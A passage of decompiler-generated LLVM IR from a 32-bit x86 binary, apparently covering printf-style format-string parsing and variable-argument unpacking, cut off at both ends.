  uselistorder i32 %v3_80513a0, { 1, 0, 2 }
  uselistorder i8 %v3_805138f, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8051386, { 1, 0 }
  uselistorder i32 %v3_8051358, { 11, 8, 10, 1, 2, 13, 14, 7, 6, 9, 12, 0, 3, 4, 5, 15, 16, 17, 18, 19 }
  uselistorder i32 %v0_8051358.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8051354, { 1, 0 }
  uselistorder i32 %v1_8051354.pre, { 1, 0 }
  uselistorder i32 %v1_8051353, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8051350, { 1, 0 }
  uselistorder i32 %v2_805135471, { 1, 0 }
  uselistorder i32 %v3_805133a, { 1, 0 }
  uselistorder i8 %v4_80512f6, { 1, 0 }
  uselistorder i32 %v1_80512f6, { 1, 0, 3, 2 }
  uselistorder i8 %v2_80512ed, { 1, 0 }
  uselistorder i32 %v2_80512c2, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_80512be, { 1, 0 }
  uselistorder i8 %v2_80512b8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80512c6, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80512a8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 6, 0, 5, 4, 1, 7, 8, 9, 10 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 2, 1, 0, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @function_8051198, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @function_8054658, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 3, 5, 6, 4, 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_80517e2, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80517db, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_80517a3, { 1, 0 }
  uselistorder label %dec_label_pc_805175a, { 1, 0 }
  uselistorder label %dec_label_pc_8051743, { 1, 0 }
  uselistorder label %dec_label_pc_80516ee, { 1, 0 }
  uselistorder label %dec_label_pc_80516c0, { 1, 0 }
  uselistorder label %dec_label_pc_80516a5, { 1, 0 }
  uselistorder label %dec_label_pc_805168f, { 1, 0 }
  uselistorder label %dec_label_pc_805167b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051676, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051608, { 1, 0 }
  uselistorder label %dec_label_pc_80515ee, { 1, 0 }
  uselistorder label %dec_label_pc_805150c, { 1, 0 }
  uselistorder label %dec_label_pc_80514b1, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805145f, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805140f, { 1, 0 }
  uselistorder label %dec_label_pc_80513f6, { 1, 0 }
  uselistorder label %dec_label_pc_80513e2, { 1, 0 }
  uselistorder label %dec_label_pc_80513dd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80513be, { 1, 0 }
  uselistorder label %dec_label_pc_8051349, { 1, 0 }
  uselistorder label %dec_label_pc_8051341, { 1, 0 }
  uselistorder label %dec_label_pc_80512ed, { 1, 0 }
  uselistorder label %dec_label_pc_80512e2, { 1, 0 }
  uselistorder label %dec_label_pc_80512b8.backedge, { 2, 1, 0 }
}

define i32 @function_80517f0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80517f0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80517f0 = load i32, i32* @esi, align 4
  %v0_80517f1 = load i32, i32* @ebx, align 4
  store i32 %v0_80517f1, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8051805 = bitcast i32* %arg1 to i8*
  %v4_8051805 = call i32 @function_8051e84(i8* %v3_8051805, i32 0, i32 188)
  %v0_805180a = load i32, i32* @ebx, align 4
  %v1_805180a = add i32 %v0_805180a, 40
  store i32 %v1_805180a, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_8051812 = add i32 %v0_805180a, 24
  %v2_8051812 = inttoptr i32 %v1_8051812 to i32*
  %v3_8051812 = load i32, i32* %v2_8051812, align 4
  %v4_8051812 = add i32 %v3_8051812, -1
  store i32 %v4_8051812, i32* %v2_8051812, align 4
  %v0_8051818 = load i32, i32* @esi, align 4
  %v1_8051818 = load i32, i32* @ebx, align 4
  %v2_8051818 = inttoptr i32 %v1_8051818 to i32*
  store i32 %v0_8051818, i32* %v2_8051818, align 4
  %v0_805181a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805181a

dec_label_pc_805181a:                             ; preds = %dec_label_pc_805181a, %dec_label_pc_80517f0
  %v0_805181a = phi i32 [ %v1_8051820, %dec_label_pc_805181a ], [ %v0_805181a.pre, %dec_label_pc_80517f0 ]
  %v1_805181a = inttoptr i32 %v0_805181a to i32*
  store i32 8, i32* %v1_805181a, align 4
  %v0_8051820 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051820 = add i32 %v0_8051820, 4
  store i32 %v1_8051820, i32* %eax.global-to-local, align 4
  %v0_8051823 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051823 = add i32 %v0_8051823, -1
  %v8_8051823 = icmp eq i32 %v1_8051823, 0
  store i32 %v1_8051823, i32* %edx.global-to-local, align 4
  %v1_8051824 = icmp eq i1 %v8_8051823, false
  br i1 %v1_8051824, label %dec_label_pc_805181a, label %dec_label_pc_8051826

dec_label_pc_8051826:                             ; preds = %dec_label_pc_805181a
  %v0_8051826 = load i32, i32* @esi, align 4
  store i32 %v0_8051826, i32* %eax.global-to-local, align 4
  %v1_805185120 = inttoptr i32 %v0_8051826 to i8*
  %v2_805185121 = load i8, i8* %v1_805185120, align 1
  %v3_805185122 = zext i8 %v2_805185121 to i32
  %v5_805185123 = and i32 %v1_8051823, -256
  %v6_805185124 = or i32 %v3_805185122, %v5_805185123
  store i32 %v6_805185124, i32* %edx.global-to-local, align 4
  %v4_805185325 = icmp eq i8 %v2_805185121, 0
  %v1_805185527 = icmp eq i1 %v4_805185325, false
  br i1 %v1_805185527, label %dec_label_pc_805182f, label %dec_label_pc_8051857

dec_label_pc_805182f:                             ; preds = %dec_label_pc_8051826, %dec_label_pc_8051851.backedge
  %v6_805185130 = phi i32 [ %v6_8051851, %dec_label_pc_8051851.backedge ], [ %v6_805185124, %dec_label_pc_8051826 ]
  %v2_805185129 = phi i8 [ %v2_8051851, %dec_label_pc_8051851.backedge ], [ %v2_805185121, %dec_label_pc_8051826 ]
  %v0_805183428 = phi i32 [ %v0_8051834.be, %dec_label_pc_8051851.backedge ], [ %v0_8051826, %dec_label_pc_8051826 ]
  %v10_805182f = icmp eq i8 %v2_805185129, 37
  %v1_8051832 = icmp eq i1 %v10_805182f, false
  br i1 %v1_8051832, label %dec_label_pc_8051850, label %dec_label_pc_8051834

dec_label_pc_8051834:                             ; preds = %dec_label_pc_805182f
  %v1_8051834 = add i32 %v0_805183428, 1
  store i32 %v1_8051834, i32* %eax.global-to-local, align 4
  %v1_8051835 = inttoptr i32 %v1_8051834 to i8*
  %v2_8051835 = load i8, i8* %v1_8051835, align 1
  %v11_8051835 = icmp eq i8 %v2_8051835, 37
  br i1 %v11_8051835, label %dec_label_pc_8051850, label %dec_label_pc_805183a

dec_label_pc_805183a:                             ; preds = %dec_label_pc_8051834
  %v1_805183d = load i32, i32* @ebx, align 4
  %v2_805183d = inttoptr i32 %v1_805183d to i32*
  store i32 %v1_8051834, i32* %v2_805183d, align 4
  %v0_805183f = load i32, i32* @ebx, align 4
  %v1_8051840 = inttoptr i32 %v0_805183f to i32*
  %v2_8051840 = call i32 @function_80519e1(i32* %v1_8051840)
  store i32 %v2_8051840, i32* %eax.global-to-local, align 4
  %v2_8051848 = icmp slt i32 %v2_8051840, 0
  br i1 %v2_8051848, label %dec_label_pc_805185b, label %dec_label_pc_805184c

dec_label_pc_805184c:                             ; preds = %dec_label_pc_805183a
  %v0_805184c = load i32, i32* @ebx, align 4
  %v1_805184c = inttoptr i32 %v0_805184c to i32*
  %v2_805184c = load i32, i32* %v1_805184c, align 4
  %v4_8051851.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051851.backedge

dec_label_pc_8051850:                             ; preds = %dec_label_pc_8051834, %dec_label_pc_805182f
  %v0_8051850 = phi i32 [ %v1_8051834, %dec_label_pc_8051834 ], [ %v0_805183428, %dec_label_pc_805182f ]
  %v1_8051850 = add i32 %v0_8051850, 1
  br label %dec_label_pc_8051851.backedge

dec_label_pc_8051851.backedge:                    ; preds = %dec_label_pc_8051850, %dec_label_pc_805184c
  %v4_8051851.be = phi i32 [ %v4_8051851.pre.pre, %dec_label_pc_805184c ], [ %v6_805185130, %dec_label_pc_8051850 ]
  %v0_8051834.be = phi i32 [ %v2_805184c, %dec_label_pc_805184c ], [ %v1_8051850, %dec_label_pc_8051850 ]
  store i32 %v0_8051834.be, i32* %eax.global-to-local, align 4
  %v1_8051851 = inttoptr i32 %v0_8051834.be to i8*
  %v2_8051851 = load i8, i8* %v1_8051851, align 1
  %v3_8051851 = zext i8 %v2_8051851 to i32
  %v5_8051851 = and i32 %v4_8051851.be, -256
  %v6_8051851 = or i32 %v3_8051851, %v5_8051851
  store i32 %v6_8051851, i32* %edx.global-to-local, align 4
  %v4_8051853 = icmp eq i8 %v2_8051851, 0
  %v1_8051855 = icmp eq i1 %v4_8051853, false
  br i1 %v1_8051855, label %dec_label_pc_805182f, label %dec_label_pc_8051851.dec_label_pc_8051857_crit_edge

dec_label_pc_8051851.dec_label_pc_8051857_crit_edge: ; preds = %dec_label_pc_8051851.backedge
  %v0_8051857.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051857

dec_label_pc_8051857:                             ; preds = %dec_label_pc_8051851.dec_label_pc_8051857_crit_edge, %dec_label_pc_8051826
  %v0_8051857 = phi i32 [ %v0_8051857.pre, %dec_label_pc_8051851.dec_label_pc_8051857_crit_edge ], [ %v0_8051826, %dec_label_pc_8051826 ]
  %v1_8051857 = load i32, i32* @ebx, align 4
  %v2_8051857 = inttoptr i32 %v1_8051857 to i32*
  store i32 %v0_8051857, i32* %v2_8051857, align 4
  br label %dec_label_pc_805185b

dec_label_pc_805185b:                             ; preds = %dec_label_pc_805183a, %dec_label_pc_8051857
  %storemerge = phi i32 [ 0, %dec_label_pc_8051857 ], [ -1, %dec_label_pc_805183a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_805185b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805185b, i32* @edx, align 4
  %v2_805185c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805185c, i32* @ebx, align 4
  store i32 %v0_80517f0, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8051851, { 1, 0 }
  uselistorder i8 %v2_8051851, { 1, 2, 0 }
  uselistorder i32 %v0_8051834.be, { 2, 1, 0 }
  uselistorder i32 %v0_805183428, { 1, 0 }
  uselistorder i32 %v0_8051826, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051823, { 0, 2, 1 }
  uselistorder i32 %v1_8051820, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 7, 6, 8 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_805185b, { 1, 0 }
  uselistorder label %dec_label_pc_805182f, { 1, 0 }
}

define i32 @function_8051860(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051860:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051860 = load i32, i32* @esi, align 4
  %v0_8051861 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805186d = add i32 %arg1, 24
  %v2_805186d = inttoptr i32 %v1_805186d to i32*
  %v3_805186d = load i32, i32* %v2_805186d, align 4
  %v2_8051870 = add i32 %arg1, 76
  %v3_8051870 = inttoptr i32 %v2_8051870 to i32*
  store i32 %arg2, i32* %v3_8051870, align 4
  %tmp8 = icmp slt i32 %v3_805186d, 1
  br i1 %tmp8, label %dec_label_pc_805189e, label %dec_label_pc_8051877

dec_label_pc_8051877:                             ; preds = %dec_label_pc_8051860
  %v1_805187a = load i32, i32* @ebx, align 4
  %v2_805187a = add i32 %v1_805187a, 28
  %v3_805187a = inttoptr i32 %v2_805187a to i32*
  store i32 %v3_805186d, i32* %v3_805187a, align 4
  %v0_805187d = load i32, i32* @ebx, align 4
  %v1_805187d = add i32 %v0_805187d, 24
  %v2_805187d = inttoptr i32 %v1_805187d to i32*
  store i32 0, i32* %v2_805187d, align 4
  %v0_8051884 = load i32, i32* @ebx, align 4
  %v1_8051884 = add i32 %v0_8051884, 4
  %v2_8051884 = inttoptr i32 %v1_8051884 to i32*
  store i32 0, i32* %v2_8051884, align 4
  %v0_805188b = load i32, i32* @ebx, align 4
  %v1_805188b = add i32 %v0_805188b, 8
  %v2_805188b = inttoptr i32 %v1_805188b to i32*
  store i32 0, i32* %v2_805188b, align 4
  %v0_8051892 = load i32, i32* @ebx, align 4
  %v1_8051893 = call i32 @function_80518a4(i32 %v0_8051892)
  %v1_805189b = load i32, i32* @ebx, align 4
  %v2_805189b = add i32 %v1_805189b, 24
  %v3_805189b = inttoptr i32 %v2_805189b to i32*
  store i32 %v3_805186d, i32* %v3_805189b, align 4
  br label %dec_label_pc_805189e

dec_label_pc_805189e:                             ; preds = %dec_label_pc_8051860, %dec_label_pc_8051877
  %v2_805189e = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8051861, i32* @ebx, align 4
  store i32 %v0_8051860, i32* @esi, align 4
  ret i32 %v2_805189e

; uselistorder directives
  uselistorder i32 %v3_805186d, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_80518a4, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805189e, { 1, 0 }
}

define i32 @function_80518a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80518a4:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80518a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80518a5, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_80518aa = add i32 %arg1, 24
  %v2_80518aa = inttoptr i32 %v1_80518aa to i32*
  %v3_80518aa = load i32, i32* %v2_80518aa, align 4
  %v4_80518aa = icmp eq i32 %v3_80518aa, 0
  %v1_80518ae = add i32 %arg1, 80
  store i32 %v1_80518ae, i32* %ebx.global-to-local, align 4
  %v1_80518b1 = icmp eq i1 %v4_80518aa, false
  %v1_8051969 = add i32 %arg1, 8
  %v2_8051969 = inttoptr i32 %v1_8051969 to i32*
  %v3_8051969 = load i32, i32* %v2_8051969, align 4
  %v8_8051969 = icmp eq i32 %v3_8051969, -2147483648
  %v1_8051970 = icmp eq i1 %v8_8051969, false
  br i1 %v1_80518b1, label %dec_label_pc_8051969, label %dec_label_pc_80518b7

dec_label_pc_80518b7:                             ; preds = %dec_label_pc_80518a4
  br i1 %v1_8051970, label %dec_label_pc_80518d1, label %dec_label_pc_80518c0

dec_label_pc_80518c0:                             ; preds = %dec_label_pc_80518b7
  %v1_80518c0 = add i32 %arg1, 76
  %v2_80518c0 = inttoptr i32 %v1_80518c0 to i32*
  %v3_80518c0 = load i32, i32* %v2_80518c0, align 4
  store i32 %v3_80518c0, i32* %eax.global-to-local, align 4
  %v1_80518c3 = add i32 %v3_80518c0, 4
  store i32 %v1_80518c3, i32* %edx.global-to-local, align 4
  store i32 %v1_80518c3, i32* %v2_80518c0, align 4
  %v0_80518c9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80518c9 = inttoptr i32 %v0_80518c9 to i32*
  %v2_80518c9 = load i32, i32* %v1_80518c9, align 4
  store i32 %v2_80518c9, i32* %eax.global-to-local, align 4
  %v1_80518cb = load i32, i32* @ecx, align 4
  %v2_80518cb = add i32 %v1_80518cb, 80
  %v3_80518cb = inttoptr i32 %v2_80518cb to i32*
  store i32 %v2_80518c9, i32* %v3_80518cb, align 4
  %v0_80518ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80518ce = load i32, i32* @ecx, align 4
  %v2_80518ce = add i32 %v1_80518ce, 8
  %v3_80518ce = inttoptr i32 %v2_80518ce to i32*
  store i32 %v0_80518ce, i32* %v3_80518ce, align 4
  %v0_80518d1.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80518d1

dec_label_pc_80518d1:                             ; preds = %dec_label_pc_80518b7, %dec_label_pc_80518c0
  %v1_80518e0 = phi i32 [ %arg1, %dec_label_pc_80518b7 ], [ %v0_80518d1.pre, %dec_label_pc_80518c0 ]
  %v1_80518d1 = add i32 %v1_80518e0, 4
  %v2_80518d1 = inttoptr i32 %v1_80518d1 to i32*
  %v3_80518d1 = load i32, i32* %v2_80518d1, align 4
  %v8_80518d1 = icmp eq i32 %v3_80518d1, -2147483648
  %v1_80518d8 = icmp eq i1 %v8_80518d1, false
  br i1 %v1_80518d8, label %dec_label_pc_80518eb, label %dec_label_pc_80518da

dec_label_pc_80518da:                             ; preds = %dec_label_pc_80518d1
  %v1_80518da = add i32 %v1_80518e0, 76
  %v2_80518da = inttoptr i32 %v1_80518da to i32*
  %v3_80518da = load i32, i32* %v2_80518da, align 4
  store i32 %v3_80518da, i32* %eax.global-to-local, align 4
  %v1_80518dd = add i32 %v3_80518da, 4
  store i32 %v1_80518dd, i32* %edx.global-to-local, align 4
  store i32 %v1_80518dd, i32* %v2_80518da, align 4
  %v0_80518e3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80518e3 = inttoptr i32 %v0_80518e3 to i32*
  %v2_80518e3 = load i32, i32* %v1_80518e3, align 4
  store i32 %v2_80518e3, i32* %eax.global-to-local, align 4
  %v1_80518e5 = load i32, i32* @ecx, align 4
  %v2_80518e5 = add i32 %v1_80518e5, 80
  %v3_80518e5 = inttoptr i32 %v2_80518e5 to i32*
  store i32 %v2_80518e3, i32* %v3_80518e5, align 4
  %v0_80518e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80518e8 = load i32, i32* @ecx, align 4
  %v2_80518e8 = add i32 %v1_80518e8, 4
  %v3_80518e8 = inttoptr i32 %v2_80518e8 to i32*
  store i32 %v0_80518e8, i32* %v3_80518e8, align 4
  %v1_805196215.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80518eb

dec_label_pc_80518eb:                             ; preds = %dec_label_pc_80518d1, %dec_label_pc_80518da
  %v1_805196215 = phi i32 [ %v1_80518e0, %dec_label_pc_80518d1 ], [ %v1_805196215.pre, %dec_label_pc_80518da ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805196216 = add i32 %v1_805196215, 28
  %v3_805196217 = inttoptr i32 %v2_805196216 to i32*
  %v4_805196218 = load i32, i32* %v3_805196217, align 4
  %v5_805196520 = icmp sgt i32 %v4_805196218, 0
  br i1 %v5_805196520, label %dec_label_pc_80518ef, label %dec_label_pc_8051997.loopexit

dec_label_pc_80518ef:                             ; preds = %dec_label_pc_80518eb, %dec_label_pc_8051961
  %v1_805196222 = phi i32 [ %v1_8051962, %dec_label_pc_8051961 ], [ %v1_805196215, %dec_label_pc_80518eb ]
  %v1_80518ef21 = phi i32 [ %v1_8051961, %dec_label_pc_8051961 ], [ 0, %dec_label_pc_80518eb ]
  %v2_80518ef = mul i32 %v1_80518ef21, 4
  %v3_80518ef = add i32 %v2_80518ef, 40
  %v4_80518ef = add i32 %v3_80518ef, %v1_805196222
  %v5_80518ef = inttoptr i32 %v4_80518ef to i32*
  %v6_80518ef = load i32, i32* %v5_80518ef, align 4
  store i32 %v6_80518ef, i32* %eax.global-to-local, align 4
  %v1_80518f3 = add i32 %v6_80518ef, -8
  %v9_80518f3 = icmp eq i32 %v1_80518f3, 0
  br i1 %v9_80518f3, label %dec_label_pc_8051961, label %dec_label_pc_80518f8

dec_label_pc_80518f8:                             ; preds = %dec_label_pc_80518ef
  %v10_80518f3 = icmp slt i32 %v1_80518f3, 0
  %v6_80518f3 = sub i32 7, %v6_80518ef
  %v7_80518f3 = and i32 %v6_80518f3, %v6_80518ef
  %v8_80518f3 = icmp slt i32 %v7_80518f3, 0
  %v1_80518f8 = add i32 %v1_805196222, 76
  %v2_80518f8 = inttoptr i32 %v1_80518f8 to i32*
  %v3_80518f8 = load i32, i32* %v2_80518f8, align 4
  store i32 %v3_80518f8, i32* %edx.global-to-local, align 4
  %v3_80518fb = icmp eq i1 %v10_80518f3, %v8_80518f3
  br i1 %v3_80518fb, label %dec_label_pc_805190b, label %dec_label_pc_80518fd

dec_label_pc_80518fd:                             ; preds = %dec_label_pc_80518f8
  %tmp13 = icmp slt i32 %v6_80518ef, 3
  %v9_8051904 = icmp eq i32 %v6_80518ef, 7
  %v1_8051907 = icmp eq i1 %v9_8051904, false
  %or.cond = or i1 %tmp13, %v1_8051907
  br i1 %or.cond, label %dec_label_pc_8051954, label %dec_label_pc_8051936

dec_label_pc_805190b:                             ; preds = %dec_label_pc_80518f8
  %tmp14 = icmp sgt i32 %v6_80518ef, 1024
  br i1 %tmp14, label %dec_label_pc_8051914, label %dec_label_pc_8051954

dec_label_pc_8051914:                             ; preds = %dec_label_pc_805190b
  %v6_8051914 = icmp eq i32 %v6_80518ef, 2048
  br i1 %v6_8051914, label %dec_label_pc_8051924, label %dec_label_pc_805191b

dec_label_pc_805191b:                             ; preds = %dec_label_pc_8051914
  %v9_805191b = icmp eq i32 %v6_80518ef, 2055
  %v1_8051920 = icmp eq i1 %v9_805191b, false
  br i1 %v1_8051920, label %dec_label_pc_8051954, label %dec_label_pc_8051945

dec_label_pc_8051924:                             ; preds = %dec_label_pc_8051914
  %v1_8051924 = add i32 %v3_80518f8, 8
  store i32 %v1_8051924, i32* %eax.global-to-local, align 4
  store i32 %v1_8051924, i32* %v2_80518f8, align 4
  %v0_805192a = load i32, i32* %edx.global-to-local, align 4
  %v1_805192a = inttoptr i32 %v0_805192a to i32*
  %v2_805192a = load i32, i32* %v1_805192a, align 4
  store i32 %v2_805192a, i32* %eax.global-to-local, align 4
  %v1_805192c = add i32 %v0_805192a, 4
  %v2_805192c = inttoptr i32 %v1_805192c to i32*
  %v3_805192c = load i32, i32* %v2_805192c, align 4
  store i32 %v3_805192c, i32* %edx.global-to-local, align 4
  %v1_805192f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805192f = inttoptr i32 %v1_805192f to i32*
  store i32 %v2_805192a, i32* %v2_805192f, align 4
  %v0_8051931 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051931 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051931 = add i32 %v1_8051931, 4
  %v3_8051931 = inttoptr i32 %v2_8051931 to i32*
  store i32 %v0_8051931, i32* %v3_8051931, align 4
  br label %dec_label_pc_805195e

dec_label_pc_8051936:                             ; preds = %dec_label_pc_80518fd
  %v3_8051936 = load i32, i32* %v2_80518f8, align 4
  store i32 %v3_8051936, i32* %edx.global-to-local, align 4
  %v1_8051939 = add i32 %v3_8051936, 8
  store i32 %v1_8051939, i32* %eax.global-to-local, align 4
  store i32 %v1_8051939, i32* %v2_80518f8, align 4
  %v0_805193f = load i32, i32* %edx.global-to-local, align 4
  %v1_805193f = inttoptr i32 %v0_805193f to double*
  %v2_805193f = load double, double* %v1_805193f, align 4
  %v2_8051941 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051941 = inttoptr i32 %v2_8051941 to double*
  store double %v2_805193f, double* %v4_8051941, align 4
  br label %dec_label_pc_805195e

dec_label_pc_8051945:                             ; preds = %dec_label_pc_805191b
  %v3_8051945 = load i32, i32* %v2_80518f8, align 4
  store i32 %v3_8051945, i32* %edx.global-to-local, align 4
  %v1_8051948 = add i32 %v3_8051945, 12
  store i32 %v1_8051948, i32* %eax.global-to-local, align 4
  store i32 %v1_8051948, i32* %v2_80518f8, align 4
  %v0_805194e = load i32, i32* %edx.global-to-local, align 4
  %v1_805194e = inttoptr i32 %v0_805194e to x86_fp80*
  %v2_805194e = load x86_fp80, x86_fp80* %v1_805194e, align 4
  %v2_8051950 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8051950 = inttoptr i32 %v2_8051950 to x86_fp80*
  store x86_fp80 %v2_805194e, x86_fp80* %v3_8051950, align 4
  br label %dec_label_pc_805195e

dec_label_pc_8051954:                             ; preds = %dec_label_pc_80518fd, %dec_label_pc_805190b, %dec_label_pc_805191b
  %v1_8051954 = add i32 %v3_80518f8, 4
  store i32 %v1_8051954, i32* %eax.global-to-local, align 4
  store i32 %v1_8051954, i32* %v2_80518f8, align 4
  %v0_805195a = load i32, i32* %edx.global-to-local, align 4
  %v1_805195a = inttoptr i32 %v0_805195a to i32*
  %v2_805195a = load i32, i32* %v1_805195a, align 4
  store i32 %v2_805195a, i32* %eax.global-to-local, align 4
  %v1_805195c = load i32, i32* %ebx.global-to-local, align 4
  %v2_805195c = inttoptr i32 %v1_805195c to i32*
  store i32 %v2_805195a, i32* %v2_805195c, align 4
  br label %dec_label_pc_805195e

dec_label_pc_805195e:                             ; preds = %dec_label_pc_8051945, %dec_label_pc_8051936, %dec_label_pc_8051924, %dec_label_pc_8051954
  %v0_805195e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805195e = add i32 %v0_805195e, 12
  store i32 %v1_805195e, i32* %ebx.global-to-local, align 4
  %v0_8051961.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051962.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051961

dec_label_pc_8051961:                             ; preds = %dec_label_pc_80518ef, %dec_label_pc_805195e
  %v1_8051962 = phi i32 [ %v1_805196222, %dec_label_pc_80518ef ], [ %v1_8051962.pre, %dec_label_pc_805195e ]
  %v0_8051961 = phi i32 [ %v1_80518ef21, %dec_label_pc_80518ef ], [ %v0_8051961.pre, %dec_label_pc_805195e ]
  %v1_8051961 = add i32 %v0_8051961, 1
  store i32 %v1_8051961, i32* %esi.global-to-local, align 4
  %v2_8051962 = add i32 %v1_8051962, 28
  %v3_8051962 = inttoptr i32 %v2_8051962 to i32*
  %v4_8051962 = load i32, i32* %v3_8051962, align 4
  %v5_8051965 = icmp slt i32 %v1_8051961, %v4_8051962
  br i1 %v5_8051965, label %dec_label_pc_80518ef, label %dec_label_pc_8051962.dec_label_pc_8051997.loopexit_crit_edge

dec_label_pc_8051969:                             ; preds = %dec_label_pc_80518a4
  br i1 %v1_8051970, label %dec_label_pc_8051980, label %dec_label_pc_8051972

dec_label_pc_8051972:                             ; preds = %dec_label_pc_8051969
  %v1_8051972 = add i32 %arg1, 36
  %v2_8051972 = inttoptr i32 %v1_8051972 to i8*
  %v3_8051972 = load i8, i8* %v2_8051972, align 1
  %v2_8051976 = zext i8 %v3_8051972 to i32
  %v3_8051976 = mul nuw nsw i32 %v2_8051976, 12
  store i32 %v3_8051976, i32* %eax.global-to-local, align 4
  %v2_8051979 = add i32 %arg1, 68
  %v3_8051979 = add i32 %v2_8051979, %v3_8051976
  %v4_8051979 = inttoptr i32 %v3_8051979 to i32*
  %v5_8051979 = load i32, i32* %v4_8051979, align 4
  store i32 %v5_8051979, i32* %eax.global-to-local, align 4
  store i32 %v5_8051979, i32* %v2_8051969, align 4
  %v0_8051980.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051980

dec_label_pc_8051980:                             ; preds = %dec_label_pc_8051969, %dec_label_pc_8051972
  %v1_8051994 = phi i32 [ %arg1, %dec_label_pc_8051969 ], [ %v0_8051980.pre, %dec_label_pc_8051972 ]
  %v1_8051980 = add i32 %v1_8051994, 4
